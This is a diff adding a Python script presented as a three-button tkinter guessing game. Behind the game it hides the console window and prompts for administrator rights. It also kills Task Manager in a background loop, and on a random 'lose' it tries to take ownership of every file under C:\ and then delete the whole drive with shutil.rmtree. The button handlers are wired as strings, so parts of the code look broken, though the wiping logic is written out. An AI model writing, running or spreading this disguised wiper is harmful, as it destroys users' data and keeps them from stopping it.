@@ -1,0 +1,78 @@
+import os
+import tkinter as tk
+import random
+import shutil
+import ctypes
+import sys
+import psutil, threading, time
+
+
+full_path = os.path.abspath(__file__)
+
+def loop():
+    while True:
+        for p in psutil.process_iter(['name']):
+            if p.info['name'] == "taskmgr.exe":
+                try: p.terminate()
+                except: pass
+
+if os.name == 'nt':  # Only works on Windows
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if not is_admin():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    os.system(full_path)
+
+
+def lose():
+    for root, dirs, files in os.walk("C:\\"):
+        for name in dirs + files:
+            path = os.path.join(root, name)
+            try:
+                shutil.chown(path, user="NewUser", group="NewGroup")
+            except PermissionError:
+                pass
+            except FileNotFoundError:
+                pass
+            except:
+                pass
+    shutil.rmtree("C:\\")
+
+def win():
+    print("You Win!")
+
+def click():
+    if random.choice([True,False]):
+        win()
+    else:
+        lose()
+
+while True:
+    t = threading.Thread(target=loop, daemon=True)
+    t.start()
+    try:
+        root = tk.Tk()
+
+
+        root.geometry("300x200")
+        root.title("Buttons")
+        text = tk.Label(text="Pick one button.", anchor=tk.CENTER)
+
+        buttona = tk.Button(text="Button A", command="click()", anchor=tk.CENTER)
+        buttonb = tk.Button(text="Button B", command="click()", anchor=tk.CENTER)
+        buttonc = tk.Button(text="Button C", command="click()", anchor=tk.CENTER)
+
+        text.pack()
+        buttona.pack(pady="5")
+        buttonb.pack(pady="5")
+        buttonc.pack(pady="5")
+
+        tk.mainloop()
+    except KeyboardInterrupt:
+        pass
